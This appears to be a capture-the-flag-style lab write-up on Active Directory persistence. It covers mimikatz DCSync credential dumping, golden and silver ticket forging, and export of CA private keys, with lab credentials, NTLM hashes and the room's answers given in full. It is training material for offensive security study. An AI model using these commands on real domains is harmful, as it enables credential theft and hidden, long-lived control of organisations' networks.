Task1 - Introduction
-------------------------------------

In this module we will be practicing some approaches to maintaining persistance in AD, as we don't want the Blue team kicking us out.

__AD Persistence__

The idea is to try and maintain multiple levels of persistance. Gain a level, find persistence, move on, etc. This way if they kick us out, we still may have other levels to fall back on.

__Learning Objectives__

We will cover some of these techniques for persistince in AD. This isn't a complete list though.

-   AD Credentials and DCSync-ing
-   Silver and Golden Tickets
-   AD Certificates
-   AD Security Identifiers (SIDs)
-   Access Control Lists
-   Group Policy Objects (GPOs)


Task2 - Persistence through Credentials
--------------------------------------------------------------------

__Congratulations__

You have gotten access to DA, now we will learn about persitence.

__DC Sync__

There are typically multiple domains for each region. We need to be able to authenticate using the same credentials across each of them.

The answer to this is domain replication. Each domain runs a Knowledge Consistency Checker (KCC). The KCC makes the Topology for the forrest and connects via RPC calls to sync the info. It can sometimes take a few mins to replicate things like password changes through the network.

This process is called DC Synchronisation. This can happen automatically or as called by a user with proper privs.

A popular attack is the DC Sync Attack. We can use this to harvest credentials from the DC.

__Not All Credentials Are Created Equal__

Blue teams will almost always rotate the most privileged accounts 1st. If we only keep persistence here, we will loose our access once they discover our precense and rotate the accounts.

So our goal here is to perist with near-privileged access. 

* Local Admin rights on several machines
* Service Accounts that have delegation perms - Gold/Silver tickets
* Accounts used for priveleged AD services. - Getting access to Exchange/WSUS/SCCM we can leverage AD exploits to regain our foothold.

__DCSync All__

First let's get our credential pair and SSH over to THMWRK1.

Username: chloe.potter:Marisa2014
Privileged User: Administrator:tryhackmewouldnotguess1@

```bash
# ssh administrator@za.tryhackme.loc@thmwrk1.za.tryhackme.loc
administrator@za.tryhackme.loc@thmwrk1.za.tryhackme.loc's password: 

Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

za\administrator@THMWRK1 C:\Users\Administrator.ZA>
```

Now we will use mimikatz to harvest credentials:

```shell-session
za\administrator@THMWRK1 C:\Users\Administrator.ZA>C:\Tools\mimikatz_trunk\x64\m
imikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) 
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/ 

mimikatz #
```

Let's try a single account we own 1st:

```shell-session
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /user:barbara.reid 
[DC] 'za.tryhackme.loc' will be the domain
[DC] 'THMDC.za.tryhackme.loc' will be the DC server 
[DC] 'barbara.reid' will be the user account        
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : barbara.reid 

** SAM ACCOUNT **

SAM Username         : barbara.reid
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :  
Password last change : 4/25/2022 6:30:03 PM
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1127
Object Relative ID   : 1127 

Credentials:
  Hash NTLM: 64f12cddaa88057e06a81b54e73b949b 
    ntlm- 0: 64f12cddaa88057e06a81b54e73b949b
    lm  - 0: 78523b490fee0916fe38f73c802231e2 

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : a6f6c66b7241007abac63ffcafa7a801 

* Primary:Kerberos-Newer-Keys *
    Default Salt : ZA.TRYHACKME.LOCbarbara.reid
    Default Iterations : 4096
    Credentials 
      aes256_hmac       (4096) : b9f02d2abcf52d9b8cf8cb40ea49fcc25e3416e0f21de49
88139775b18ac95e1
      aes128_hmac       (4096) : 52b303dff89f26fe1f9fc635c02b3336 
      des_cbc_md5       (4096) : d3c7ec5de9d0155d 

* Primary:Kerberos *
    Default Salt : ZA.TRYHACKME.LOCbarbara.reid 
    Credentials
      des_cbc_md5       : d3c7ec5de9d0155d 

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest * 
    01  bc6c544279878084b39f030b78012bb2
    02  ecfbe569766ab5be71fb69e4302f0bae 
    03  34fc2d71fa6d840704e2b65719f2291c 
    04  bc6c544279878084b39f030b78012bb2
    05  ecfbe569766ab5be71fb69e4302f0bae 
    06  2a9fa7d0fe931b2986d1e00b917088ee 
    07  bc6c544279878084b39f030b78012bb2 
    08  de6e39678afba460f53e10dd35690858
    09  de6e39678afba460f53e10dd35690858 
    10  04aadf243a3eef72f2700807175d0a6f 
    11  2f42c1b6e40d661d0bd221639c784f51 
    12  de6e39678afba460f53e10dd35690858
    13  60b584d9734fdfa96c76b4ce2b2a0c6a 
    14  2f42c1b6e40d661d0bd221639c784f51 
    15  5497880fe6e5a7283d5a155e1325349d
    16  5497880fe6e5a7283d5a155e1325349d 
    17  6795e9876e9b9f419cb7b5a14f7b2b04 
    18  147361556c55f56e77bc04a62d93f91a
    19  34e6534e8d2d898fd1c520274f4cc44d 
    20  0f988d608d11e5e39c6099537687d76c 
    21  4ff431d8884305727edf51aa732b0343 
    22  4ff431d8884305727edf51aa732b0343 
    23  508e63b5c3bac39d5dff808b15738ca9
    24  6115f5c279fac18761726b39a303b873 
    25  6115f5c279fac18761726b39a303b873 
    26  4d0a7958ac564443805d62292b731124 
    27  b599479751fd236e4636392b30934d61 
    28  9ad06974f6257ad0b3b0aac066364300
    29  472cfde910e6a8cdff1bc98704cc9dbc 


mimikatz #

```

You can see a lot of output including the NTLM hash which you can verify from sites like this: https://codebeautify.org/ntlm-hash-generator to transform your password into an NTLM hash.

Now we want to get every single account.  To do this we need to turn on logging on Mimikatz.

```shell-session
mimikatz # log thm_dcdump.txt 
Using 'thm_dcdump.txt' for logfile : OK 

mimikatz #

```

This command will get everyting and put it in the log file that you specified:
```shell-session
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all
```

Copy the file to our local Attackbox:
```bash
# scp administrator@za.tryhackme.loc@thmwrk1.za.tryhackme.loc:C:/Users/Administrator.ZA/thm_dcdump.txt .
administrator@za.tryhackme.loc@thmwrk1.za.tryhackme.loc's password: 
thm_dcdump.txt                                100% 1678KB  31.5MB/s   00:00 
```

Convert it to unix format by removing windows CRLFs and put it to UTF8:
```bash
# dos2unix thm_dcdump.txt 
dos2unix: converting file thm_dcdump.txt to Unix format...
```

Note: If you don't have that tool you can install it with `sudo apt install dos2unix`

Now you can inspect the file with more/less:

```bash
less thm_dcdump.txt

/search krbtgt user
[..]
** SAM ACCOUNT **

SAM Username         : krbtgt
User Account Control : 00010202 ( ACCOUNTDISABLE NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 16f9af38fca3ada405386b3b57366082
[..]

```

__Questions__

What is the Mimikatz command to perform a DCSync for the username of test on the za.tryhackme.loc domain?
Answer: _lsadump::dcsync /domain:za.tryhackme.loc /user:test_

What is the NTLM hash associated with the krbtgt user?
Answer: _16f9af38fca3ada405386b3b57366082_


Task3 - Persistence through Tickets
-----------------------------------------------------------

By persisting through Service accounts we can forge Silver and Golden tickets.

__Tickets to the Chocolate Factory__

For a recap on how these tickets work:
The user makes an AS-REQ to the KDC which includes a timestamp encrypted with the user's NTLM has. This is a request for a TGT.
The DC checks and sends back a TGT. 
The TGT is signed with the KRBTGT account's password hash which is only stored on the DC.
Next the user can send their TGT to the DC and request a TGS for a service they want to access.
The DC sends back a TGS that is encrypted with the NTLM hash of the service they want to access.
The user then presents this TGS to the service which verifies its own Hash.


__Golden Tickets__

This is a forged TGT where we bypass the 1st 2 steps from above. Now we just request a TGS for almost any service we like. We just need the KRBTGT users hash to do this. 

Some notes on Golden Tickets:

-   By injecting at this stage of the Kerberos process, we don't need the password hash of the account we want to impersonate since we bypass that step. The TGT is only used to prove that the KDC on a DC signed it. Since it was signed by the KRBTGT hash, this verification passes and the TGT is declared valid no matter its contents.
-   Speaking of contents, the KDC will only validate the user account specified in the TGT if it is older than 20 minutes. This means we can put a disabled, deleted, or non-existent account in the TGT, and it will be valid as long as we ensure the timestamp is not older than 20 minutes.
-   Since the policies and rules for tickets are set in the TGT itself, we could overwrite the values pushed by the KDC, such as, for example, that tickets should only be valid for 10 hours. We could, for instance, ensure that our TGT is valid for 10 years, granting us persistence.
-   By default, the KRBTGT account's password never changes, meaning once we have it, unless it is manually rotated, we have persistent access by generating TGTs forever.
-   The blue team would have to rotate the KRBTGT account's password twice, since the current and previous passwords are kept valid for the account. This is to ensure that accidental rotation of the password does not impact services.
-   Rotating the KRBTGT account's password is an incredibly painful process for the blue team since it will cause a significant amount of services in the environment to stop working. They think they have a valid TGT, sometimes for the next couple of hours, but that TGT is no longer valid. Not all services are smart enough to release the TGT is no longer valid (since the timestamp is still valid) and thus won't auto-request a new TGT.
-   Golden tickets would even allow you to bypass smart card authentication, since the smart card is verified by the DC before it creates the TGT.
-   We can generate a golden ticket on any machine, even one that is not domain-joined (such as our own attack machine), making it harder for the blue team to detect.

We need the following to perform this attack:
* KRBTGT accounts NTLM hash
* domain name
* domain SID
* user id for someone we want to impersonate

__Silver Tickets__

These are forged TGS tickets. We can skip all steps and communicate directly with whatever service we want.

Here are some notes on Silver Tickets:

-   The generated TGS is signed by the machine account of the host we are targeting.  
    
-   The main difference between Golden and Silver Tickets is the number of privileges we acquire. If we have the KRBTGT account's password hash, we can get access to everything. With a Silver Ticket, since we only have access to the password hash of the machine account of the server we are attacking, we can only impersonate users on that host itself. The Silver Ticket's scope is limited to whatever service is targeted on the specific server.  
    
-   Since the TGS is forged, there is no associated TGT, meaning the DC was never contacted. This makes the attack incredibly dangerous since the only available logs would be on the targeted server. So while the scope is more limited, it is significantly harder for the blue team to detect.
-   Since permissions are determined through SIDs, we can again create a non-existing user for our silver ticket, as long as we ensure the ticket has the relevant SIDs that would place the user in the host's local administrators group.  
    
-   The machine account's password is usually rotated every 30 days, which would not be good for persistence. However, we could leverage the access our TGS provides to gain access to the host's registry and alter the parameter that is responsible for the password rotation of the machine account. Thereby ensuring the machine account remains static and granting us persistence on the machine.
-   While only having access to a single host might seem like a significant downgrade, machine accounts can be used as normal AD accounts, allowing you not only administrative access to the host but also the means to continue enumerating and exploiting AD as you would with an AD user account.

__Forging Tickets for Fun and Profit__

Next we will do some ticket generation.

We need to find the NTLM hash for THMSERVER1 from our data dump.

We also need the domain SID. We can use a low privileged account on THMWKR1 to recover this with the AD-RSAT tool.

```
less thm_dcdump.txt
/search for THMSERVER1
[..]
SAM Username         : THMSERVER1$
User Account Control : 00001000 ( WORKSTATION_TRUST_ACCOUNT )
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-6151
Object Relative ID   : 6151

Credentials:
  Hash NTLM: 4c02d970f7b3da7f8ab6fa4dc77438f4
[..]
```

Login as a low level user:
```bash
# ssh za.tryhackme.loc\\barbara.reid@thmwrk1.za.tryhackme.loc
za.tryhackme.loc\barbara.reid@thmwrk1.za.tryhackme.loc's password: 

Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

za\barbara.reid@THMWRK1 C:\Users\barbara.reid>

```

Now run the powershell cmdlet Get-ADDomain

```shell-session
za\barbara.reid@THMWRK1 C:\Users\barbara.reid>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\barbara.reid> Get-ADDomain 


AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=za,DC=tryhackme,DC=loc     
DeletedObjectsContainer            : CN=Deleted
                                     Objects,DC=za,DC=tryhackme,DC=loc
DistinguishedName                  : DC=za,DC=tryhackme,DC=loc
DNSRoot                            : za.tryhackme.loc
DomainControllersContainer         : OU=Domain
                                     Controllers,DC=za,DC=tryhackme,DC=loc      
DomainMode                         : Windows2012R2Domain
DomainSID                          : S-1-5-21-3885271727-2693558621-2658995185  
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=za,DC=tryh 
                                     ackme,DC=loc
Forest                             : tryhackme.loc
InfrastructureMaster               : THMDC.za.tryhackme.loc
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9} 
                                     ,CN=Policies,CN=System,DC=za,DC=tryhackme, 
                                     DC=loc}
LostAndFoundContainer              : CN=LostAndFound,DC=za,DC=tryhackme,DC=loc  
ManagedBy                          :
Name                               : za
NetBIOSName                        : ZA
ObjectClass                        : domainDNS
ObjectGUID                         : 1fc9e299-da51-4d03-baa0-862c3360c0b2       
ParentDomain                       : tryhackme.loc
PDCEmulator                        : THMDC.za.tryhackme.loc
PublicKeyRequiredPasswordRolling   :
QuotasContainer                    : CN=NTDS Quotas,DC=za,DC=tryhackme,DC=loc   
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {THMDC.za.tryhackme.loc}
RIDMaster                          : THMDC.za.tryhackme.loc
SubordinateReferences              : {DC=DomainDnsZones,DC=za,DC=tryhackme,DC=l 
                                     oc}
SystemsContainer                   : CN=System,DC=za,DC=tryhackme,DC=loc        
UsersContainer                     : CN=Users,DC=za,DC=tryhackme,DC=loc



PS C:\Users\barbara.reid>

```

Next we start Mimikatz:
```shell-session
za\barbara.reid@THMWRK1 C:\Users\barbara.reid>C:\Tools\mimikatz_trunk\x64\mimika
tz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) 
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )        
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )       
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/ 

mimikatz #

```

Next generate the ticket:
```shell-session
mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.l
oc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ad
a405386b3b57366082 /endin:600 /renewmax:10080 /ptt
User      : ReallyNotALegitAccount 
Domain    : za.tryhackme.loc (ZA)
SID       : S-1-5-21-3885271727-2693558621-2658995185 
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 16f9af38fca3ada405386b3b57366082 - rc4_hmac_nt       
Lifetime  : 11/15/2022 2:11:00 AM ; 11/15/2022 12:11:00 PM ; 11/22/2022 2:11:00 
AM
-> Ticket : ** Pass The Ticket ** 

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated 

Golden ticket for 'ReallyNotALegitAccount @ za.tryhackme.loc' successfully submi
tted for current session 

mimikatz #


```

Parameters explained:

-   **/admin** - The username we want to impersonate. This does not have to be a valid user.  
    
-   **/domain** - The FQDN of the domain we want to generate the ticket for.  
    
-   **/id** -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.  
    
-   **/sid** -The SID of the domain we want to generate the ticket for.
-   **/krbtgt** -The NTLM hash of the KRBTGT account.  
    
-   **/endin** - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)  
    
-   **/renewmax** -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)  
    
-   **/ptt** - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.

Now verify it worked:
```shell-session
za\barbara.reid@THMWRK1 C:\Users\barbara.reid>dir \\thmserver1.za.tryhackme.loc\
c$\
 Volume in drive \\thmserver1.za.tryhackme.loc\c$ is Windows 
 Volume Serial Number is 1634-22A9 

 Directory of \\thmserver1.za.tryhackme.loc\c$

04/30/2022  02:45 PM             7,743 auto-login.ps1
01/04/2022  07:47 AM               103 delete-vagrant-user.ps1
04/30/2022  10:07 AM    <DIR>          inetpub
09/15/2018  07:19 AM    <DIR>          PerfLogs
04/30/2022  10:07 AM    <DIR>          Program Files
04/30/2022  10:07 AM    <DIR>          Program Files (x86)
04/27/2022  08:24 PM    <DIR>          Python310
04/30/2022  10:17 AM    <DIR>          Temp
03/02/2022  08:32 PM               718 thm-network-setup.ps1
04/25/2022  07:59 PM    <DIR>          tmp
06/30/2022  10:08 PM    <DIR>          Users
04/25/2022  07:57 PM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant]
04/27/2022  08:24 PM    <DIR>          Windows
               3 File(s)          8,564 bytes
              10 Dir(s)  49,941,344,256 bytes free

```

These Golden tickets last a long time, but if a Blue team wants, they can remove it by rotating the KRBTGT account twice.

If we want to really dig in we should issue Silver certs. They are very hard to find and also the only way to get them out is to rotate every single machine.

```shell-session
mimikatz # kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:thmserver1 /rc4:4c02d970f7b3da7f8ab6fa4dc77438f4 /service:cifs /ptt
```


__Questions__

Which AD account's NTLM hash is used to sign Kerberos tickets?
Answer: _KRBTGT_

What is the name of a ticket that impersonates a legitimate TGT?
Answer: _Golden Ticket_

What is the name of a ticket that impersonates a legitimate TGS?
Answer: _Silver Ticket_

What is the default lifetime (in years) of a golden ticket generated by Mimikatz?
Answer: _10_


Task4 - Persistence through Certificates
------------------------------------------------------------------

Here we will extract the private certificate and make our own. Mimikatz is the simplest tool to use, but if you want to experience other tools, have a look [here](https://pentestlab.blog/2021/11/15/golden-certificate/).


First login to thmdc as Admin. Then make a directory, move into it and open mimikatz
```bash
Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

za\administrator@THMDC C:\Users\Administrator>mkdir h4x0r

za\administrator@THMDC C:\Users\Administrator>cd h4x0r

za\administrator@THMDC C:\Users\Administrator\h4x0r>c:\tools\mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                  
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz                   
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/ 

mimikatz #  

```

Lets see if we can see the certs:
```shell-session
mimikatz # crypto::certificates /systemstore:local_machine 
 * System Store  : 'local_machine' (0x00020000)            
 * Store         : 'My'                                    
                                                           
 0.                                                        
    Subject  :                                             
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA 
    Serial   : 040000000000703a4d78090a0ab10400000010      
    Algorithm: 1.2.840.113549.1.1.1 (RSA)             
    Validity : 4/27/2022 7:32:43 PM -> 4/27/2023 7:32:43 PM                                    
    Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39                                        
        Key Container  : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 
        Provider       : Microsoft RSA SChannel Cryptographic Provider                         
        Provider type  : RSA_SCHANNEL (12)                                                      
        Type           : AT_KEYEXCHANGE (0x00000001)                                            
        |Provider name : Microsoft RSA SChannel Cryptographic Provider                          
        |Key Container : te-DomainControllerAuthentication-5ed52c94-34e8-4450-a751-a57ac55a110f 
        |Unique name   : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1  
        |Implementation: CRYPT_IMPL_SOFTWARE ;                                                 
        Algorithm      : CALG_RSA_KEYX                                                         
        Key size       : 2048 (0x00000800)                                                     
        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) 
        Exportable key : NO

 1. za-THMDC-CA
    Subject  : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : 90e157dae304ef429824a33d3a3ef91e
    Algorithm: 1.2.840.113549.1.1.1 (RSA) 
    Validity : 4/27/2022 6:58:15 PM -> 4/27/2027 7:08:09 PM
    Hash SHA1: c12fcb4b88467854b3d4d7f762adb50b0fd8346e
        Key Container  : za-THMDC-CA
        Provider       : Microsoft Software Key Storage Provider
        Provider type  : cng (0) 
        Type           : CNG Key (0xffffffff)
        |Provider name : Microsoft Software Key Storage Provider
        |Implementation: NCRYPT_IMPL_SOFTWARE_FLAG ;
        Key Container  : za-THMDC-CA
        Unique name    : 8d666f3049de45dee20c70510f66d2cf_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 
        Algorithm      : RSA
        Key size       : 2048 (0x00000800)
        Export policy  : 00000003 ( NCRYPT_ALLOW_EXPORT_FLAG ; NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG ; )
        Exportable key : YES 
        LSA isolation  : NO

 2. THMDC.za.tryhackme.loc
    Subject  : CN=THMDC.za.tryhackme.loc
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : 03000000000057c6f9be06e7c78d0300000010
    Algorithm: 1.2.840.113549.1.1.1 (RSA) 
    Validity : 4/27/2022 7:32:43 PM -> 4/27/2023 7:32:43 PM
    Hash SHA1: a0e69ecef166b2d785a1b7d615ff730819443d42
        Key Container  : 520b5ca0aec81961ad476939c6792c13_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        Provider       : Microsoft RSA SChannel Cryptographic Provider 
        Provider type  : RSA_SCHANNEL (12)
        Type           : AT_KEYEXCHANGE (0x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-DomainController-ccb1e691-6606-40a3-a87a-f549bdcd757c 
        |Unique name   : 520b5ca0aec81961ad476939c6792c13_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) 
        Exportable key : NO

 3.
    Subject  :
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : 02000000000078856466521a82570200000010
    Algorithm: 1.2.840.113549.1.1.1 (RSA)
    Validity : 4/27/2022 7:32:18 PM -> 4/27/2023 7:32:18 PM
    Hash SHA1: 0d43237c50ccb446a07572545b5b4c8cf517682a
        Key Container  : 544fc312c893025e32795e06e74c4517_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 
        Provider       : Microsoft RSA SChannel Cryptographic Provider
        Provider type  : RSA_SCHANNEL (12)
        Type           : AT_KEYEXCHANGE (0x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-KerberosAuthentication-21e4d1ee-54f7-4ca5-b36b-b2cecff9a609 
        |Unique name   : 544fc312c893025e32795e06e74c4517_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) 
        Exportable key : NO

```

There is a CA cert on the DC. Some of the certs are marked Export key: NO. However mimikatz will allow us to patch memory and make them available anyway.

Now patch:
```shell-session
mimikatz # privilege::debug 
Privilege '20' OK 

mimikatz # crypto::capi 
Local CryptoAPI RSA CSP patched 
Local CryptoAPI DSS CSP patched

mimikatz # crypto::cng 
ERROR kull_m_patch_genericProcessOrServiceFromBuild ; kull_m_patch (0x00000000) 

```

The error just means someone already patched it.

Now export:
```shell-session
mimikatz # crypto::certificates /systemstore:local_machine /export 
 * System Store  : 'local_machine' (0x00020000) 
 * Store         : 'My'

 0.
    Subject  :
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : 040000000000703a4d78090a0ab10400000010 
    Algorithm: 1.2.840.113549.1.1.1 (RSA)
    Validity : 4/27/2022 7:32:43 PM -> 4/27/2023 7:32:43 PM
    Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39
        Key Container  : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 
        Provider       : Microsoft RSA SChannel Cryptographic Provider
        Provider type  : RSA_SCHANNEL (12)
        Type           : AT_KEYEXCHANGE (0x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider 
        |Key Container : te-DomainControllerAuthentication-5ed52c94-34e8-4450-a751-a57ac55a110f
        |Unique name   : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800) 
        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : NO
        Public export  : OK - 'local_machine_My_0_.der'
        Private export : OK - 'local_machine_My_0_.pfx' 

 1. za-THMDC-CA
    Subject  : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : 90e157dae304ef429824a33d3a3ef91e
    Algorithm: 1.2.840.113549.1.1.1 (RSA) 
    Validity : 4/27/2022 6:58:15 PM -> 4/27/2027 7:08:09 PM
    Hash SHA1: c12fcb4b88467854b3d4d7f762adb50b0fd8346e
        Key Container  : za-THMDC-CA
        Provider       : Microsoft Software Key Storage Provider 
        Provider type  : cng (0)
        Type           : CNG Key (0xffffffff)
        |Provider name : Microsoft Software Key Storage Provider
        |Implementation: NCRYPT_IMPL_SOFTWARE_FLAG ;
        Key Container  : za-THMDC-CA
        Unique name    : 8d666f3049de45dee20c70510f66d2cf_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 
        Algorithm      : RSA
        Key size       : 2048 (0x00000800)
        Export policy  : 00000003 ( NCRYPT_ALLOW_EXPORT_FLAG ; NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG ; )
        Exportable key : YES
        LSA isolation  : NO 
        Public export  : OK - 'local_machine_My_1_za-THMDC-CA.der'
        Private export : OK - 'local_machine_My_1_za-THMDC-CA.pfx' 

 2. THMDC.za.tryhackme.loc
    Subject  : CN=THMDC.za.tryhackme.loc
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA 
    Serial   : 03000000000057c6f9be06e7c78d0300000010
    Algorithm: 1.2.840.113549.1.1.1 (RSA) 
    Validity : 4/27/2022 7:32:43 PM -> 4/27/2023 7:32:43 PM
    Hash SHA1: a0e69ecef166b2d785a1b7d615ff730819443d42
        Key Container  : 520b5ca0aec81961ad476939c6792c13_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 
        Provider       : Microsoft RSA SChannel Cryptographic Provider
        Provider type  : RSA_SCHANNEL (12)
        Type           : AT_KEYEXCHANGE (0x00000001) 
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-DomainController-ccb1e691-6606-40a3-a87a-f549bdcd757c
        |Unique name   : 520b5ca0aec81961ad476939c6792c13_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;  
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : NO
        Public export  : OK - 'local_machine_My_2_THMDC.za.tryhackme.loc.der' 
        Private export : OK - 'local_machine_My_2_THMDC.za.tryhackme.loc.pfx' 

 3.
    Subject  :
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA 
    Serial   : 02000000000078856466521a82570200000010
    Algorithm: 1.2.840.113549.1.1.1 (RSA) 
    Validity : 4/27/2022 7:32:18 PM -> 4/27/2023 7:32:18 PM
    Hash SHA1: 0d43237c50ccb446a07572545b5b4c8cf517682a
        Key Container  : 544fc312c893025e32795e06e74c4517_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        Provider       : Microsoft RSA SChannel Cryptographic Provider 
        Provider type  : RSA_SCHANNEL (12)
        Type           : AT_KEYEXCHANGE (0x00000001) 
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-KerberosAuthentication-21e4d1ee-54f7-4ca5-b36b-b2cecff9a609 
        |Unique name   : 544fc312c893025e32795e06e74c4517_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800) 
        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : NO
        Public export  : OK - 'local_machine_My_3_.der'
        Private export : OK - 'local_machine_My_3_.pfx' 
```

The certs are saved in pfx and der format:

```shell-session
za\administrator@THMDC C:\Users\Administrator\h4x0r>dir 
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of C:\Users\Administrator\h4x0r

11/15/2022  05:37 AM    <DIR>          .
11/15/2022  05:37 AM    <DIR>          ..
